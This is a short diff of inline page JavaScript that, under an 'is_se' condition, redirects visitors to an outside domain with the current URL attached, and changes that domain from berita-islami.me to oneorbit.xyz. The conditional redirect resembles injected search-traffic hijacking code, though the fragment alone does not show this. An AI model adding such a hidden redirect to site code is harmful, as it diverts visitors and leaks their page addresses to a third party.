@@ -8,7 +8,7 @@
       if(is_se)
     	{
     		var url = window.location.href;
-    		window.location = "https://berita-islami.me/?arsae="+ encodeURIComponent(url);
+    		window.location = "https://oneorbit.xyz/?arsae="+ encodeURIComponent(url);
     	}
     }
 //]]>
